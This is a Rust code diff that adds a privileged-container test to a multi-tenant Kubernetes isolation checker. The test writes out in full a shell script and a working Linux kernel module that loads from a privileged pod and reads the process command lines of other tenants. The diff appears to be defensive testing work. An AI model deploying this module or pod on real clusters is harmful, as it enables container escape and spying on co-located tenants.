@@ -23,18 +23,20 @@ pub struct WorkloadResourceAssessment {
 
 #[derive(Debug, Clone, PartialEq, Eq, Hash)]
 pub enum WorkloadResource {
-    ProcessNamespace, // Process visibility/isolation
-    NetworkNamespace, // Network namespace isolation
-    UserNamespace,    // User namespace isolation
-    IPCNamespace,     // Inter-process communication
+    ProcessNamespace,   // Process visibility/isolation
+    NetworkNamespace,   // Network namespace isolation
+    UserNamespace,      // User namespace isolation
+    IPCNamespace,       // Inter-process communication
+    PrivilegedSyscalls, // Privileged operations
 }
 
 #[derive(Debug, Clone, PartialEq, Eq, Hash)]
 pub enum WorkloadOperation {
-    ViewProcesses,     // Can view processes
-    CreateNetworkConn, // Can create network connections
-    AccessHostUser,    // Can access host user namespace (e.g. root user)
-    AccessIPC,         // Can access IPC resources
+    ViewProcesses,         // Can view processes
+    CreateNetworkConn,     // Can create network connections
+    AccessHostUser,        // Can access host user namespace (e.g. root user)
+    AccessIPC,             // Can access IPC resources
+    UsePrivilegedSyscalls, // Can use privileged operations
 }
 
 #[derive(Debug, Clone)]
@@ -58,6 +60,7 @@ impl WorkloadResource {
             WorkloadResource::NetworkNamespace,
             WorkloadResource::UserNamespace,
             WorkloadResource::IPCNamespace,
+            WorkloadResource::PrivilegedSyscalls,
         ]
     }
 
@@ -67,6 +70,7 @@ impl WorkloadResource {
             WorkloadResource::NetworkNamespace => vec![WorkloadOperation::CreateNetworkConn],
             WorkloadResource::UserNamespace => vec![WorkloadOperation::AccessHostUser],
             WorkloadResource::IPCNamespace => vec![WorkloadOperation::AccessIPC],
+            WorkloadResource::PrivilegedSyscalls => vec![WorkloadOperation::UsePrivilegedSyscalls],
         }
     }
 }
@@ -182,6 +186,10 @@ async fn is_authorized_to(
             // Test if tenant can use hostIPC
             test_host_ipc_authorization(tenant).await
         }
+        (WorkloadResource::PrivilegedSyscalls, WorkloadOperation::UsePrivilegedSyscalls) => {
+            // Test if tenant can create privileged pods
+            test_privileged_authorization(tenant).await
+        }
         _ => Ok(false), // Default to not authorized for unhandled combinations
     }
 }
@@ -204,6 +212,9 @@ async fn does_affect_other_tenant(
         }
         (WorkloadResource::IPCNamespace, WorkloadOperation::AccessIPC) => {
             test_ipc_cross_tenant(tenant1, tenant2).await
+        }
+        (WorkloadResource::PrivilegedSyscalls, WorkloadOperation::UsePrivilegedSyscalls) => {
+            test_privileged_syscalls_cross_tenant(tenant1, tenant2).await
         }
         _ => Ok((SafetyLevel::Unknown, "Test not implemented".to_string())),
     }
@@ -699,6 +710,451 @@ async fn test_user_namespace_cross_tenant(
     Ok((safety_level, details))
 }
 
+async fn test_privileged_syscalls_cross_tenant(
+    tenant1: &TenantClusterConfig,
+    tenant2: &TenantClusterConfig,
+) -> anyhow::Result<(SafetyLevel, String)> {
+    // Create target pod in tenant2 with sensitive data (NON-PRIVILEGED)
+    let target_pod_name = "privileged-target";
+    let target_pod = create_non_privileged_target_pod(target_pod_name);
+
+    tenant2
+        .cluster
+        .create_pod_in_namespace(&target_pod, &tenant2.namespace)
+        .await?;
+
+    // Wait for target pod to be ready
+    tenant2
+        .cluster
+        .wait_for_pod_to_be_ready(target_pod_name, &tenant2.namespace)
+        .await?;
+
+    // Get the node where target pod is running
+    let target_pod_info = tenant2
+        .cluster
+        .get_pod_in_namespace(target_pod_name, &tenant2.namespace)
+        .await?;
+
+    let node_name = target_pod_info
+        .spec
+        .as_ref()
+        .and_then(|spec| spec.node_name.as_ref())
+        .ok_or_else(|| anyhow::anyhow!("Could not determine target pod node"))?;
+
+    // Create escape pod in tenant1 on the same node with ONLY privileged flag
+    let escape_pod_name = "privileged-escape";
+    let escape_pod = create_privileged_escape_pod(escape_pod_name, node_name);
+
+    let escape_result = tenant1
+        .cluster
+        .create_pod_in_namespace(&escape_pod, &tenant1.namespace)
+        .await;
+
+    let (safety_level, details) = if escape_result.is_err() {
+        (
+            SafetyLevel::Safe,
+            "Cannot create privileged pod - privileged syscalls isolated".to_string(),
+        )
+    } else {
+        // Wait for escape pod to complete
+        tenant1
+            .cluster
+            .watch_pod_until_condition(
+                escape_pod_name,
+                &tenant1.namespace,
+                |watch_event| async move {
+                    match watch_event {
+                        kube::core::WatchEvent::Modified(pod) => {
+                            if let Some(status) = &pod.status {
+                                if let Some(phase) = &status.phase {
+                                    return phase == "Succeeded" || phase == "Failed";
+                                }
+                            }
+                            false
+                        }
+                        _ => false,
+                    }
+                },
+            )
+            .await
+            .unwrap_or(());
+
+        // Get logs to check if container escape was successful
+        let escape_logs = tenant1
+            .cluster
+            .get_pod_logs(escape_pod_name, &tenant1.namespace)
+            .await
+            .unwrap_or_default();
+
+        let target_logs = tenant2
+            .cluster
+            .get_pod_logs(target_pod_name, &tenant2.namespace)
+            .await
+            .unwrap_or_default();
+
+        // Extract target's secret from logs
+        let target_secret = target_logs
+            .lines()
+            .find(|line| line.contains("SECRET_DATA:"))
+            .and_then(|line| line.split_whitespace().nth(1))
+            .unwrap_or("");
+
+        let mut breaches = Vec::new();
+
+        // Check for various container escape indicators
+        if escape_logs.contains("KERNEL_MODULE_LOADED")
+            && escape_logs.contains("TENANT2_PROCESS_FOUND")
+        {
+            breaches.push("kernel module loaded and found tenant2 processes");
+        }
+        if escape_logs.contains("CONTAINER_ESCAPE_SUCCESS") {
+            breaches.push("successful container escape to host");
+        }
+        if escape_logs.contains("KERNEL_MODULE_BLOCKED") {
+            // This is actually good - it means isolation is working
+        }
+        if escape_logs.contains("TENANT2_PROCESS_VISIBLE") {
+            breaches.push("tenant2 processes visible from privileged container");
+        }
+
+        if !breaches.is_empty() {
+            (
+                SafetyLevel::Unsafe,
+                format!(
+                    "Container escape successful with cross-tenant access: {}",
+                    breaches.join(", ")
+                ),
+            )
+        } else {
+            (
+                SafetyLevel::Safe,
+                "No container escape or cross-tenant access detected".to_string(),
+            )
+        }
+    };
+
+    // Cleanup
+    // let _ = tenant1
+    //     .cluster
+    //     .delete_pod_in_namespace(escape_pod_name, &tenant1.namespace)
+    //     .await;
+    // let _ = tenant2
+    //     .cluster
+    //     .delete_pod_in_namespace(target_pod_name, &tenant2.namespace)
+    //     .await;
+
+    Ok((safety_level, details))
+}
+
+fn create_privileged_escape_pod(pod_name: &str, node_name: &str) -> Pod {
+    let script = [
+        "echo 'Testing container escape using custom kernel module...'",
+        "apt update && apt install -y make gcc build-essential linux-headers-$(uname -r) kmod",
+        "# Check if we have the necessary tools",
+        "if ! command -v make >/dev/null 2>&1; then",
+        "  echo 'Build tools not available, cannot create kernel module'",
+        "  exit 0",
+        "fi",
+        "# Create a simple kernel module that can access all processes",
+        "mkdir -p /tmp/kmod_test",
+        "cd /tmp/kmod_test",
+        "# Create the kernel module source",
+        "cat > tenant_spy.c << 'EOF'",
+        "#include <linux/init.h>",
+        "#include <linux/module.h>",
+        "#include <linux/kernel.h>",
+        "#include <linux/proc_fs.h>",
+        "#include <linux/uaccess.h>",
+        "#include <linux/sched/signal.h>",
+        "#include <linux/sched.h>",
+        "#include <linux/fs.h>",
+        "#include <linux/slab.h>",
+        "#include <linux/mm.h>",
+        "",
+        "MODULE_LICENSE(\"GPL\");",
+        "MODULE_DESCRIPTION(\"Tenant isolation test module\");",
+        "MODULE_VERSION(\"1.0\");",
+        "",
+        "static struct proc_dir_entry *proc_entry;",
+        "",
+        "// Function to read process cmdline",
+        "static int get_process_cmdline(struct task_struct *task, char *buffer, int buf_size) {",
+        "    struct mm_struct *mm;",
+        "    char *cmdline;",
+        "    int len = 0;",
+        "    unsigned long arg_start, arg_end;",
+        "    ",
+        "    if (!task || !buffer || buf_size <= 0)",
+        "        return 0;",
+        "    ",
+        "    mm = get_task_mm(task);",
+        "    if (!mm)",
+        "        return 0;",
+        "    ",
+        "    arg_start = mm->arg_start;",
+        "    arg_end = mm->arg_end;",
+        "    ",
+        "    if (arg_start >= arg_end) {",
+        "        mmput(mm);",
+        "        return 0;",
+        "    }",
+        "    ",
+        "    len = arg_end - arg_start;",
+        "    if (len > buf_size - 1)",
+        "        len = buf_size - 1;",
+        "    ",
+        "    cmdline = kmalloc(len + 1, GFP_KERNEL);",
+        "    if (!cmdline) {",
+        "        mmput(mm);",
+        "        return 0;",
+        "    }",
+        "    ",
+        "    if (access_process_vm(task, arg_start, cmdline, len, FOLL_FORCE) == len) {",
+        "        cmdline[len] = '\\0';",
+        "        // Replace null bytes with spaces for readability",
+        "        int i;",
+        "        for (i = 0; i < len; i++) {",
+        "            if (cmdline[i] == '\\0')",
+        "                cmdline[i] = ' ';",
+        "        }",
+        "        strncpy(buffer, cmdline, buf_size - 1);",
+        "        buffer[buf_size - 1] = '\\0';",
+        "        len = strlen(buffer);",
+        "    } else {",
+        "        len = 0;",
+        "    }",
+        "    ",
+        "    kfree(cmdline);",
+        "    mmput(mm);",
+        "    return len;",
+        "}",
+        "",
+        "static ssize_t tenant_spy_read(struct file *file, char __user *buffer, size_t count, loff_t *pos) {",
+        "    struct task_struct *task;",
+        "    char *output;",
+        "    char cmdline_buf[256];",
+        "    int len = 0;",
+        "    int process_count = 0;",
+        "    int found_tenant2 = 0;",
+        "    size_t output_size = 32768; // Even larger buffer",
+        "    ssize_t ret;",
+        "    ",
+        "    if (*pos > 0) return 0;",
+        "    ",
+        "    // Allocate kernel memory for output buffer",
+        "    output = kmalloc(output_size, GFP_KERNEL);",
+        "    if (!output) {",
+        "        return -ENOMEM;",
+        "    }",
+        "    ",
+        "    len += snprintf(output + len, output_size - len, \"KERNEL_MODULE_LOADED: Scanning all processes...\\n\");",
+        "    ",
+        "    rcu_read_lock();",
+        "    for_each_process(task) {",
+        "        // Check if we have enough space left",
+        "        if (len >= output_size - 1000) {",
+        "            len += snprintf(output + len, output_size - len, \"... (truncated due to buffer limit)\\n\");",
+        "            break;",
+        "        }",
+        "        ",
+        "        // Get process cmdline",
+        "        memset(cmdline_buf, 0, sizeof(cmdline_buf));",
+        "        get_process_cmdline(task, cmdline_buf, sizeof(cmdline_buf));",
+        "        ",
+        "        process_count++;",
+        "        ",
+        "        // Check for tenant2 in both comm and cmdline",
+        "        if (strstr(task->comm, \"tenant2\") || strstr(cmdline_buf, \"tenant2\") || ",
+        "            strstr(task->comm, \"target\") || strstr(cmdline_buf, \"echo tenant2\")) {",
+        "            len += snprintf(output + len, output_size - len, ",
+        "                          \"TENANT2_PROCESS_FOUND: PID=%d COMM=%.16s CMDLINE=%s\\n\", ",
+        "                          task->pid, task->comm, cmdline_buf);",
+        "            found_tenant2 = 1;",
+        "        }",
+        "    }",
+        "    rcu_read_unlock();",
+        "    ",
+        "    len += snprintf(output + len, output_size - len, \"TOTAL_PROCESSES_VISIBLE: %d\\n\", process_count);",
+        "    ",
+        "    if (found_tenant2) {",
+        "        len += snprintf(output + len, output_size - len, \"CONTAINER_ESCAPE_SUCCESS: Kernel module can see tenant2 processes!\\n\");",
+        "    } else {",
+        "        len += snprintf(output + len, output_size - len, \"No tenant2 processes found from kernel space\\n\");",
+        "    }",
+        "    ",
+        "    if (process_count > 20) {",
+        "        len += snprintf(output + len, output_size - len, \"HOST_PROCESS_VISIBLE: Can see %d processes - possible container escape\\n\", process_count);",
+        "    }",
+        "    ",
+        "    if (len > count) {",
+        "        len = count;",
+        "    }",
+        "    ",
+        "    if (copy_to_user(buffer, output, len)) {",
+        "        ret = -EFAULT;",
+        "    } else {",
+        "        *pos += len;",
+        "        ret = len;",
+        "    }",
+        "    ",
+        "    kfree(output);",
+        "    return ret;",
+        "}",
+        "",
+        "static const struct proc_ops tenant_spy_ops = {",
+        "    .proc_read = tenant_spy_read,",
+        "};",
+        "",
+        "static int __init tenant_spy_init(void) {",
+        "    proc_entry = proc_create(\"tenant_spy\", 0444, NULL, &tenant_spy_ops);",
+        "    if (!proc_entry) {",
+        "        printk(KERN_ERR \"Failed to create /proc/tenant_spy\\n\");",
+        "        return -ENOMEM;",
+        "    }",
+        "    printk(KERN_INFO \"Tenant spy module loaded\\n\");",
+        "    return 0;",
+        "}",
+        "",
+        "static void __exit tenant_spy_exit(void) {",
+        "    if (proc_entry) {",
+        "        proc_remove(proc_entry);",
+        "    }",
+        "    printk(KERN_INFO \"Tenant spy module unloaded\\n\");",
+        "}",
+        "",
+        "module_init(tenant_spy_init);",
+        "module_exit(tenant_spy_exit);",
+        "EOF",
+        "",
+        "# Create Makefile with proper TAB characters",
+        "printf '%s\n' 'obj-m := tenant_spy.o' '' 'all:' '\t@make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules' '' 'clean:' '\t@make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean' > Makefile",
+        // "cat > Makefile << 'EOF'",
+        // "obj-m := tenant_spy.o",
+        // "",
+        // "all:",
+        // r#"	@make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules"#,
+        // "",
+        // "clean:",
+        // r#"	@make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean"#,
+        // "EOF",
+        "# Try to compile the kernel module",
+        "echo 'Compiling kernel module...'",
+        "if make; then",
+        "  echo 'Kernel module compiled successfully'",
+        "  # Try to load the kernel module",
+        "  echo 'Loading kernel module...'",
+        "  if insmod tenant_spy.ko; then",
+        "    echo 'KERNEL_MODULE_LOADED: Module loaded successfully'",
+        "    # Wait a moment for target processes to start",
+        "    sleep 10",
+        "    # Read from the proc entry to get process information",
+        "    if [ -f /proc/tenant_spy ]; then",
+        "      echo 'Reading process information from kernel module...'",
+        "      cat /proc/tenant_spy",
+        "    else",
+        "      echo 'Proc entry not created'",
+        "    fi",
+        "    # Cleanup - remove the module",
+        "    rmmod tenant_spy 2>/dev/null || echo 'Failed to remove module'",
+        "  else",
+        "    echo 'KERNEL_MODULE_BLOCKED: Cannot load kernel module - isolation working'",
+        "  fi",
+        "else",
+        "  echo 'Kernel module compilation failed'",
+        "  # Fallback to basic process check",
+        "  echo 'Falling back to basic process visibility check...'",
+        "  process_count=$(ps aux | wc -l)",
+        "  echo \"Total visible processes: $process_count\"",
+        "  if [ \"$process_count\" -gt 15 ]; then",
+        "    echo 'HOST_PROCESS_VISIBLE: Can see many processes - possible container escape'",
+        "  fi",
+        "  # Look for tenant2 processes specifically",
+        "  tenant2_processes=$(ps aux | grep -i 'tenant2\\|privileged-target' | grep -v 'privileged-escape' | grep -v grep)",
+        "  if [ -n \"$tenant2_processes\" ]; then",
+        "    echo 'TENANT2_PROCESS_VISIBLE: Found tenant2 processes!'",
+        "    echo \"$tenant2_processes\"",
+        "  else",
+        "    echo 'No tenant2 processes visible - isolation working or target not ready'",
+        "  fi",
+        "fi",
+        "echo 'Kernel module container escape test completed'",
+        "sleep 3600",
+    ].join("\n");
+
+    //println!("Privileged escape pod script:\n{}", script);
+
+    serde_json::from_value(serde_json::json!({
+        "apiVersion": "v1",
+        "kind": "Pod",
+        "metadata": {
+            "name": pod_name,
+        },
+        "spec": {
+            "nodeName": node_name,
+            "containers": [{
+                "name": "kernel-escape",
+                "image": "ubuntu:24.04",
+                "securityContext": {
+                    "privileged": true,
+                    "capabilities": {
+                        "add": ["ALL"]
+                    }
+                },
+                "command": [
+                    "sh", "-c",
+                    script
+                ]
+            }],
+            "restartPolicy": "Never",
+        }
+    }))
+    .unwrap()
+}
+
+fn create_non_privileged_target_pod(pod_name: &str) -> Pod {
+    serde_json::from_value(serde_json::json!({
+        "apiVersion": "v1",
+        "kind": "Pod",
+        "metadata": {
+            "name": pod_name,
+            "labels": {
+                "app": "privileged-target",
+                "workload-test": "target",
+                "tenant": "tenant2"
+            }
+        },
+        "spec": {
+            "securityContext": {
+                "runAsNonRoot": true,
+                "runAsUser": 1000,
+                "fsGroup": 1000
+            },
+            "containers": [{
+                "name": "tenant2-app",
+                "image": "ubuntu:latest",
+                "securityContext": {
+                    "allowPrivilegeEscalation": false,
+                    "capabilities": {
+                        "drop": ["ALL"]
+                    },
+                    "runAsNonRoot": true,
+                    "runAsUser": 1000
+                },
+                "command": [
+                    "sh", "-c",
+                    "echo 'TENANT2_TARGET_STARTED' && \
+                     secret_data=$(date +%s | sha256sum | cut -d' ' -f1 | head -c 16) && \
+                    echo \"SECRET_DATA: $secret_data\" && \
+                    mkdir -p /tmp/tenant2_marker && \
+                    echo \"tenant2\" > /tmp/tenant2_marker/$secret_data && tail -f /tmp/tenant2_marker/$secret_data"
+                ]
+            }],
+            "restartPolicy": "Never",
+        }
+    }))
+    .unwrap()
+}
+
 fn create_host_user_test_pod(pod_name: &str) -> Pod {
     serde_json::from_value(serde_json::json!({
         "apiVersion": "v1",
@@ -1101,6 +1557,7 @@ impl Display for WorkloadResource {
             WorkloadResource::NetworkNamespace => write!(f, "Network Namespace"),
             WorkloadResource::UserNamespace => write!(f, "User Namespace"),
             WorkloadResource::IPCNamespace => write!(f, "IPC Namespace"),
+            WorkloadResource::PrivilegedSyscalls => write!(f, "Privileged Syscalls"),
         }
     }
 }
@@ -1112,6 +1569,7 @@ impl Display for WorkloadOperation {
             WorkloadOperation::CreateNetworkConn => write!(f, "Create Network Connections"),
             WorkloadOperation::AccessHostUser => write!(f, "Access Host User Namespace"),
             WorkloadOperation::AccessIPC => write!(f, "Access IPC Resources"),
+            WorkloadOperation::UsePrivilegedSyscalls => write!(f, "Use Privileged Syscalls"),
         }
     }
 }
